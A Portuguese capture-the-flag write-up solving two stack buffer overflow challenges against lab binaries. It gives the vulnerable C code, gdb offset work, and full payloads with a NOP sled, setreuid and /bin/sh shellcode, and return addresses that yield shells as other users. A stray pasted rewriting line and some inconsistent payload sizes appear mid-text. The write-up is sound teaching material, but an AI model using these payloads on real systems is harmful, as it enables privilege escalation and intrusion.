# Buffer Overflow 
###### Written by @Mayaracar2
>These are challenges about Buffer Overflows
## Definição
Um buffer overflow (estouro de buffer) é uma falha de segurança que ocorre quando um programa tenta escrever mais dados em um "buffer" (uma área de memória de tamanho fixo) do que ele pode conter. Isso faz com que os dados excedentes sobrescrevam áreas de memória adjacentes.sse comportamento pode corromper dados, causar falhas no programa ou, em um cenário de exploração, permitir que um atacante execute código malicioso para assumir o controle do sistema.

## Desafio Buffer Overflow 1
Explorar a falha de buffer overflow para obter uma shell e ler o conteúdo do arquivo `secret.txt`.

Código fornecido:
```bash
#include <stdio.h>
#include <stdlib.h>

void copy_arg(char *string)
{
    char buffer[140];
    strcpy(buffer, string);
    printf("%s\n", buffer);
    return 0;
}

int main(int argc, char **argv)
{
    printf("Here's a program that echo's out your input\n");
    copy_arg(argv[1]);
}
```
## Solução
A análise do binário indicou um buffer local de 140 bytes. Considerando os 8 bytes de preenchimento para o RBP salvo (padrão em x64) e assumindo um endereço de retorno de 6 bytes, a estimativa inicial para o payload total necessário para a sobrescrita é de 154 bytes (140 + 8 + 6)

Utilize o seguinte comando no gdb:

`gdb buffer-overflow`

`run $(python -c "print('\x41'*154)") `

<img width="678" height="186" alt="image" src="https://github.com/user-attachments/assets/eef256bb-d372-4b0d-9179-99ddf50f62f7" />

Podemos ver que temos apenas 2 bytes escritos no endereço de retorno. Como precisamos de 6 no total, precisamos adicionar mais 4 bytes ao nosso payload.

`$(python -c "print('\x41'*158)")`

<img width="673" height="200" alt="image" src="https://github.com/user-attachments/assets/559aa62a-1481-4cf5-ac55-6940a8519229" />

Como o acesso ao arquivo secreto requeria privilégios do user2 (UID 1002), o shellcode teve que ser modificado. Utilizou-se pwntools para gerar um payload que, antes de invocar a shell, altera o UID do processo para 1002.

`id -u user2`

<img width="448" height="59" alt="image" src="https://github.com/user-attachments/assets/dc702a03-89c8-401b-9829-2ae6aad7639f" />

Em seguida utilize: 

`pwn shellcraft -f d amd64.linux.setreuid 1002`

Com isso, podemos adicioná-lo ao nosso código e procurar o endereço de retorno do nosso código shell no gdb.

Nosso shellcode agora tem 54 bytes. Excluindo o endereço de retorno de 6 bytes, restam 98 bytes. Nosso payload ficará assim:

`| NOPs 90 | Shellcode 54 | random characters 8 | return address 6|`

Depois disso, precisamos verificar o registro para ver onde nosso código shell começa.

`run $(python -c "print('\x90' * 76 + '\x31\xff\x66\xbf\xea\x03\x6a\x71\x58\x48\x89\xfe\x0f\x05' + '\x6a\x3b\x58\x48\x31\xd2\x49\xb8\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x49\xc1\xe8\x08\x41\x50\x48\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05\x6a\x3c\x58\x48\x31\xff\x0f\x05' + 'A' * 22 + 'B' * 6)")`

`x/100x $rsp-200`

<img width="646" height="441" alt="image" src="https://github.com/user-attachments/assets/feab275f-f468-4b79-88d4-af59ae5c073d" />

A análise da memória mostrou o início do NOP sled (\x90), seguido pelo shellcode. Qualquer endereço dentro deste NOP sled pode ser usado como endereço de retorno.

Aqui está uma versão simplificada e mais fluida, mantendo o tom técnico do writeup:

"A análise da memória mostrou o início do NOP sled (\x90), seguido pelo shellcode. Qualquer endereço dentro deste NOP sled pode ser usado como endereço de retorno.

Para este payload, foi escolhido o endereço `0x7fffffffe298`. Convertendo-o para o formato little-endian (o padrão de arquitetura), o endereço de retorno a ser usado é:

`'\x98\xe2\xff\xff\xff\x7f'`

Agora podemos adicionar isso à nossa carga útil, sair do gdb e executar o binário com nossa carga útil.

```bash
run $ (python -c "print('\x90' * 76 + '\x31\xff\x66\xbf\xea\x03\x6a\x71\x58\x48\x89\xfe\x0f\x05' + '\x6a\x3b\x58\x48\x31\xd2\x49\xb8\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x49\xc1\xe8\x08\x41\x50\x48\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05\x6a\x3c\x58\x48\x31\xff\x0f\x05' + 'A' * 22 + '\x98\xe2\xff\xff\xff\x7f')")
```

Depois de acessar o user2, basta ler o arquivo com o comando:

```bash
cat secret.txt.
```

>`omgyoudidthissocool!!`

## Desafio Buffer Overflow 2
Use o mesmo método que foi usado anteriormente para ler o conteúdo do aquivo secreto.

### Solução 
Podemos usar o mesmo método, mas precisamos modificar um pouco nosso shellcode.

Olhando para o binário, podemos ver que nosso buffer agora tem 154 de comprimento e está pré-preenchido com a palavra `doggo.`

```bash
#include <stdio.h>
#include <stdlib.h>

void concat_arg(char *string)
{
    char buffer[154] = "doggo";
    strcat(buffer, string);
    printf("new word is %s\n", buffer);
    return 0;
}

int main(int argc, char **argv)
{
    concat_arg(argv[1]);
}
```

Vamos verificar o comprimento necessário para nossa carga útil novamente usando o gdb. Adicionando nosso buffer (154), caracteres aleatórios (8) e endereço de retorno (6).

`run $(python -c "print('\x41'*168)")`

`run $(python -c "print('\x41'*169)")`

<img width="660" height="380" alt="image" src="https://github.com/user-attachments/assets/2dc1b441-3f34-4478-b939-1872a102bb9b" />

Logo, adicionaremos um pedaço de código para alterar o nosso id para o id do user3: `id -u user3`

<img width="398" height="54" alt="image" src="https://github.com/user-attachments/assets/23562f84-a3b7-47d0-b45b-53a674a59b87" />


Em seguida utilize o seguinte comando: 

`pwn shellcraft -f d amd64.linux.setreuid 1003`

Agora precisamos encontrar o início do nosso shellcode novamente, como fizemos da última vez.

`run $(python -c "print('\x90' * 100 + '\x31\xff\x66\xbf\xeb\x03\x6a\x71\x58\x48\x89\xfe\x0f\x05' + '\x6a\x3b\x58\x48\x31\xd2\x49\xb8\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x49\xc1\xe8\x08\x41\x50\x48\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05\x6a\x3c\x58\x48\x31\xff\x0f\x05' + 'A' * 9 + 'B' * 6)")`

<img width="931" height="786" alt="image" src="https://github.com/user-attachments/assets/df775898-6750-4878-9cb8-4aac33e8d4f0" />

O endereço 0x7fffffffe298 (em little-endian: `\x98\xe2\xff\xff\xff\x7f`), que aponta para o NOP sled, foi usado novamente como o endereço de retorno. A execução do binário com este payload final concedeu acesso a uma shell como user3.

`run $ (python -c "print('\x90' * 100 + '\x31\xff\x66\xbf\xeb\x03\x6a\x71\x58\x48\x89\xfe\x0f\x05' + '\x6a\x3b\x58\x48\x31\xd2\x49\xb8\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x49\xc1\xe8\x08\x41\x50\x48\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05\x6a\x3c\x58\x48\x31\xff\x0f\x05' + 'A' * 9 + '\x98\xe2\xff\xff\xff\x7f')")`

Acessando novamente o arquivo `secret.txt` usando o comando `cat` e estando conectado no user3 temos:

>`wowanothertime!!`

## Conclusão
Estes desafios demonstraram com sucesso a exploração prática de vulnerabilidades de stack-based buffer overflow. Através da análise em GDB, foi possível calcular os offsets corretos para sobrescrever o endereço de retorno (RIP).

A técnica central envolveu a injeção de um shellcode personalizado (para alterar o UID com setreuid e invocar uma shell) e o redirecionamento do fluxo de execução do programa para ele. Os exercícios destacam o perigo crítico de usar funções inseguras como strcpy e strcat sem validação de limites, o que pode levar diretamente à execução de código arbitrário e à escalada de privilégios.








